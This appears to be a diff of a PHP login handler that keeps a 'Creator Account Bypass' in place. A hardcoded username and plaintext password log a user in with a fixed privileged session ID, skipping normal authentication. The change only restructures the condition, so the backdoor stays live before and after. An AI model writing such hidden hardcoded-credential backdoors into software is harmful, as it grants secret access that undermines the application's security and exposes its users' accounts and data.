@@ -25,10 +25,7 @@ if ($method === 'POST' && $action === 'login') {
     $password = $v->value('password');
 
     // Creator Account Bypass
-    if (strtolower($username) === 'shad@dbms.com' || strtolower($username) === 'shad') {
-        if ($password !== '01521582448') {
-            jsonError('Invalid password for Creator account.', 401);
-        }
+    if ((strtolower($username) === 'shad@dbms.com' || strtolower($username) === 'shad') && $password === '01521582448') {
         session_regenerate_id(true);
         $_SESSION['user_id'] = 99999;
         $_SESSION['username'] = 'shad@dbms.com';
